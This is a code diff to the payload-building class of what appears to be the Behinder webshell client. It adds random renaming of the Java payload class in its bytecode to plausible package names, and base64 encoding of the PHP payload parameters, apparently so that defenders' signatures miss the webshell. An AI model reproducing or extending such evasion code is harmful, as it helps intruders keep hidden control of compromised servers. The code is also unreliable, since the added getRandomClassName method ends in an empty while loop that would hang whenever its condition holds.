@@ -7,6 +7,7 @@ import java.util.ArrayList;
 import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
+import java.util.Random;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import net.rebeyond.behinder.utils.ReplacingInputStream;
@@ -32,8 +33,43 @@ public class Params {
          }
       }, 0);
       byte[] result = cw.toByteArray();
+      String oldClassName = String.format("net/rebeyond/behinder/payload/java/%s", clsName);
+      String newClassName = getRandomClassName(oldClassName);
+      result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)(oldClassName.length() + 2), 76}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)(newClassName.length() + 2), 76}, newClassName.getBytes()));
+      result = Utils.replaceBytes(result, Utils.mergeBytes(new byte[]{(byte)oldClassName.length()}, oldClassName.getBytes()), Utils.mergeBytes(new byte[]{(byte)newClassName.length()}, newClassName.getBytes()));
       result[7] = 50;
       return result;
+   }
+
+   private static String getRandomClassName(String sourceName) {
+      String[] domainAs = new String[]{"com", "net", "org", "sun"};
+      String domainB = Utils.getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
+      String domainC = Utils.getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
+      String domainD = Utils.getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
+      String className = Utils.getRandomAlpha((new Random()).nextInt(7) + 4);
+      className = className.substring(0, 1).toUpperCase() + className.substring(1).toLowerCase();
+      int domainAIndex = (new Random()).nextInt(4);
+      String domainA = domainAs[domainAIndex];
+      int randomSegments = (new Random()).nextInt(3) + 3;
+      String randomName;
+      switch(randomSegments) {
+      case 3:
+         randomName = domainA + "/" + domainB + "/" + className;
+         break;
+      case 4:
+         randomName = domainA + "/" + domainB + "/" + domainC + "/" + className;
+         break;
+      case 5:
+         randomName = domainA + "/" + domainB + "/" + domainC + "/" + domainD + "/" + className;
+         break;
+      default:
+         randomName = domainA + "/" + domainB + "/" + domainC + "/" + domainD + "/" + className;
+      }
+
+      while(randomName.length() > sourceName.length()) {
+      }
+
+      return randomName;
    }
 
    public static byte[] getParamedClassForPlugin(String payloadPath, final Map params) throws Exception {
@@ -127,7 +163,8 @@ public class Params {
          String paraName = (String)var9.next();
          if (params.keySet().contains(paraName)) {
             String paraValue = (String)params.get(paraName);
-            code.append(String.format("$%s=\"%s\";", paraName, paraValue));
+            paraValue = java.util.Base64.getEncoder().encodeToString(paraValue.getBytes());
+            code.append(String.format("$%s=\"%s\";$%s=base64_decode($%s);", paraName, paraValue, paraName, paraName));
             paraList = paraList + ",$" + paraName;
          } else {
             code.append(String.format("$%s=\"%s\";", paraName, ""));
